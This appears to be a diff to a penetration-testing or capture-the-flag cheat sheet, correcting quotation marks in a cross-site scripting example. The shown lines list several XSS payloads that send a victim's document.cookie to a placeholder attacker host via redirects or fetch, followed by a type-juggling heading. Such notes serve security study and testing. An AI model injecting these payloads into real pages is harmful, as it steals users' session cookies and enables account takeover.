@@ -297,10 +297,11 @@ https://malwaredecoder.com/
 
 -> Examples
   
-`<script type=“text/javascript”>document.location=“http://ip/?cookie=“+document.cookie;</script>`  
+`<script type="text/javascript">document.location="http://ip/?cookie="+document.cookie;</script>`  
 `<script>window.location="http://ip/?cookie="+document.cookie;</script>`  
 `<script>document.location="http://ip/?cookie="+document.cookie;</script>`  
 `<script>fetch('https://ip/?cookie=' + btoa(document.cookie));</script>`  
+
 ## Type Juggling
 
 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
